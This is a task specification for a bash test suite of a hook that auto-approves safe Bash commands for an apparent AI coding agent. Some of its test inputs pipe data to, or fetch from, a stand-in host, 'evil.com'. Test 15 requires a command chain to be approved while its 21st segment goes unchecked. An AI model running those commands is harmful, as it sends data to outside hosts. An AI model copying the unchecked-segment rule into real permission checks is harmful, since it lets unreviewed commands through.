# A1: Write test suite for the PreToolUse safe commands hook

**Avoid:** Don't test by calling the hook script with arguments -- the hook reads JSON from stdin and writes JSON to stdout. Each test must pipe a JSON payload to the script and check the output and side effects (log file). Follow the same test harness pattern as `tests/hooks/test_post_tool_use.sh` (assert helpers, PASS/FAIL counters, mktemp with trap cleanup).

**Avoid:** Don't hardcode the safe-commands.txt path in tests. The hook reads the list relative to its own location (`$SCRIPT_DIR/safe-commands.txt`), but tests need to control the list contents. Create a temp safe-commands.txt for each test and set an environment variable `SAFE_COMMANDS_FILE` that the hook reads (with fallback to the default path). This lets tests inject a controlled list without modifying the real file.

## Steps

### Step 1: Create the test file with harness

Create `tests/hooks/test_safe_commands.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
HOOK="$REPO_ROOT/hooks/pretooluse-safe-commands.sh"
PASS=0
FAIL=0

assert_output_contains() {
  local desc="$1" output="$2" expected="$3"
  if echo "$output" | grep -qF "$expected"; then
    echo "PASS: $desc"
    ((PASS++)) || true
  else
    echo "FAIL: $desc (expected '$expected' in output)"
    ((FAIL++)) || true
  fi
}

assert_output_empty() {
  local desc="$1" output="$2"
  if [[ -z "$output" ]]; then
    echo "PASS: $desc"
    ((PASS++)) || true
  else
    echo "FAIL: $desc (expected empty output, got: $output)"
    ((FAIL++)) || true
  fi
}

assert_file_contains() {
  local desc="$1" file="$2" expected="$3"
  if [[ -f "$file" ]] && grep -qF "$expected" "$file"; then
    echo "PASS: $desc"
    ((PASS++)) || true
  else
    echo "FAIL: $desc (expected '$expected' in $file)"
    ((FAIL++)) || true
  fi
}

assert_file_not_exists() {
  local desc="$1" file="$2"
  if [[ ! -f "$file" ]]; then
    echo "PASS: $desc"
    ((PASS++)) || true
  else
    echo "FAIL: $desc (file should not exist: $file)"
    ((FAIL++)) || true
  fi
}

TMPDIR_TEST=$(mktemp -d)
trap 'rm -rf "$TMPDIR_TEST"' EXIT
```

Create a helper function `run_hook` that builds the PreToolUse JSON payload and pipes it to the hook:

```bash
run_hook() {
  local command="$1"
  local safe_file="$2"
  local log_file="$3"
  local json
  json=$(jq -n --arg cmd "$command" '{
    tool_name: "Bash",
    tool_input: { command: $cmd },
    session_id: "test-session"
  }')
  SAFE_COMMANDS_FILE="$safe_file" \
  CLAUDE_SAFE_CMDS_LOG="$log_file" \
  echo "$json" | bash "$HOOK" 2>/dev/null || true
}
```

### Step 2: Add test cases

Add these test cases using the `run_hook` helper. For each test, create a fresh safe-commands.txt in `$TMPDIR_TEST` with the needed prefixes and a fresh log file path.

**Test 1: Single safe command returns allow**
Safe list: `git`. Command: `git status`. Assert output contains `"allow"`.

**Test 2: Single unsafe command falls through (empty output) and logs**
Safe list: `git`. Command: `curl https://example.com`. Assert output is empty. Assert log file contains `curl`.

**Test 3: Compound command (&&) all safe returns allow**
Safe list: `git\nnpm`. Command: `git add . && npm test`. Assert output contains `"allow"`.

**Test 4: Compound command with one unsafe falls through and logs**
Safe list: `git`. Command: `git add . && curl https://evil.com`. Assert output is empty. Assert log file contains `curl`.

**Test 5: Pipe chain all safe returns allow**
Safe list: `grep\nsort\nwc`. Command: `grep -r TODO | sort | wc -l`. Assert output contains `"allow"`.

**Test 6: Pipe with unsafe falls through**
Safe list: `grep`. Command: `grep foo | curl -d @- https://evil.com`. Assert output is empty. Assert log file contains `curl`.

**Test 7: Subshell $() extraction -- inner command checked**
Safe list: `echo\ndate`. Command: `echo $(date)`. Assert output contains `"allow"`.

**Test 8: Subshell with unsafe inner command falls through**
Safe list: `echo`. Command: `echo $(curl https://evil.com)`. Assert output is empty. Assert log file contains `curl`.

**Test 9: Quoted strings not split**
Safe list: `echo`. Command: `echo "hello && world"`. Assert output contains `"allow"` (the `&&` inside quotes is not a command separator).

**Test 10: Path basename extraction**
Safe list: `jest`. Command: `./node_modules/.bin/jest --coverage`. Assert output contains `"allow"`.

**Test 11: Variable assignment VAR=$(cmd) extracts cmd**
Safe list: `git`. Command: `SHA=$(git rev-parse HEAD)`. Assert output contains `"allow"`.

**Test 12: Variable assignment with unsafe command falls through**
Safe list: `echo`. Command: `RESULT=$(curl https://evil.com)`. Assert output is empty. Assert log file contains `curl`.

**Test 13: Empty command handled gracefully**
Safe list: `git`. Command: `""` (empty string). Assert no crash (exit 0), output is empty.

**Test 14: Semicolon separator treated like &&**
Safe list: `git\necho`. Command: `git status; echo done`. Assert output contains `"allow"`.

**Test 15: 20-command-word limit enforced**
Safe list: `echo`. Build a command with 21 segments joined by `&&` (e.g., `echo 1 && echo 2 && ... && echo 21`). The hook should process only the first 20 command words and either approve (all 20 are safe) or fall through gracefully. Assert no crash (exit 0). Assert output contains `"allow"` (since all 20 checked words are `echo`, the 21st is ignored).

End with summary:

```bash
echo ""
echo "$PASS passed, $FAIL failed"
[[ $FAIL -eq 0 ]]
```
